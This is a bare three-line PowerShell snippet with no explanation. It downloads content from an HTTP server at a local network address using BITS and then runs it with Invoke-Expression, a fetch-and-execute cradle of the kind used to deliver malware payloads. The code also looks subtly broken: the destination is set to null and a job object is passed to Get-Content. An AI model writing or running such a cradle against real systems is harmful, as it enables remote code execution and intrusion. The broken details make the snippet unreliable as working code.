$job = Start-BitsTransfer -Source "http://192.168.1.2:8080" -Destination $null
while ($job.JobState -eq "Transferring") { Start-Sleep 1 }
IEX (Get-Content $job | Out-String)
